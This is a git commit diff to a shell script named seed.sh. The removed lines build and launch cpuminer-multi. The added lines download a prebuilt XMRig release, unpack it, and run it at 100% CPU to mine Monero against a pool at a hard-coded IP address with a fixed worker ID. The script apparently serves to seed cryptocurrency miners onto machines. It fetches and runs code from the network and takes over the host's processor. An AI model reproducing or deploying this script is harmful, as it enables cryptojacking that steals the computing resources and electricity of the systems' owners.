a519feb24385b7782f6b7d7ac270b8ee9e76a6a8
red56565 <108178533+red56565@users.noreply.github.com>
2022-07-14 00:16:01 +0200

    Update seed.sh

--- seed.sh
+++ seed.sh
@@ -1,7 +1,4 @@
-sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev autotools-dev automake
-git clone https://github.com/hyc/cpuminer-multi
-cd cpuminer-multi
-./autogen.sh
-CFLAGS="-march=native" ./configure
-make
-sudo ./minerd -o stratum+tcp://168.235.86.33:3393 -u SK_pDKo9B7rTqyPDrYeohNv5.blade333
+wget https://github.com/xmrig/xmrig/releases/download/v2.11.0/xmrig-2.11.0-xenial-x64.tar.gz
+tar -zxf xmrig-2.11.0-xenial-x64.tar.gz
+cd xmrig-2.11.0
+./xmrig --max-cpu-usage 100 --donate-level 5 -o 168.235.86.33:3393 -u SK_QzApkbVGsAxyQykaWSnEF.blade333 -k --coin monero -a cn/gpu
